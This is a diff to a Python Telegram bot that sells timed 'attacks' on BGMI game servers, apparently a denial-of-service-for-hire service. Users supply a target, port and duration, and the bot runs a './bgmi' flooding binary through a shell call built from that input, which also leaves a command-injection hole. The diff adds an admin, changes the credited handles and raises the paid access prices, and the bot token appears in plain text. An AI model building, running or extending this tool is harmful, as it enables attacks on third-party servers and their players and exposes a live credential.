@@ -10,7 +10,7 @@ import os
 bot = telebot.TeleBot('7343477389:AAEL3rdXEVk9F1O1twhwtTsPdlEL72qrzKg')
 
 # Admin user IDs
-admin_id = ["6829567767", "1705593541", "", ""]
+admin_id = ["6829567767", "1705593541", "5679673719", ""]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -207,7 +207,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𓄂⋆ͣ͟⋆ͫ≛⃝Ꮮᴀꜱᴛ×͜×Wᴀʀɴɪɴɢ☂❶࿐&♡➳⌁Prͥofͣfͫessor⌁➳♡ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI Provide by @hardhackar007 & @Profess0rrr"
+    response = f"{username}, LAST WARNING & BADLIAR 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI Provide by @hardhackar007"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -243,7 +243,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished.@hardhackar007 Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished.@hardhackar007 & @BADLIAR2001 & @Profess0rrr Target: {target} Port: {port} Port: {time}"
         else:
             response = "kya karta hai bhai 🤣✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
@@ -276,7 +276,7 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text ='''𓄂⋆ͣ͟⋆ͫ≛⃝Ꮮᴀꜱᴛ×͜×Wᴀʀɴɪɴɢ☂❶࿐ & ♡➳⌁Prͥofͣfͫessor⌁➳♡🤖 Available commands:
+    help_text ='''LAST_WARNING & BADLIAR & ♡➳⌁Prͥofͣfͫessor⌁➳♡ 🤖 Available commands:
 💥 /bgmi : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
@@ -300,9 +300,9 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f''' Programmer https://amalgamative-prereq.000webhostapp.com/Programmer.html ⚠️ 👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+    response = f''' Developer @BADLIAR2001 Programmer https://amalgamative-prereq.000webhostapp.com/Programmer.html ⚠️ 👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-WELCOME @hardhackar007 &  @Profess0rrr TO THE SERVER FREEZE BOT'''
+WELCOME @hardhackar007 & @BADLIAR2001 & @Profess0rrr TO THE SERVER FREEZE BOT'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -326,9 +326,9 @@ Vip 🌟 :
 -> Concurrents Attack : 300
 
 Pr-ice List💸 :
-Day-->30 Rs
-Week-->500Rs
-Month-->1000 Rs
+Day-->50Rs
+Week-->700Rs
+Month-->2000Rs
 '''
     bot.reply_to(message, response)
 
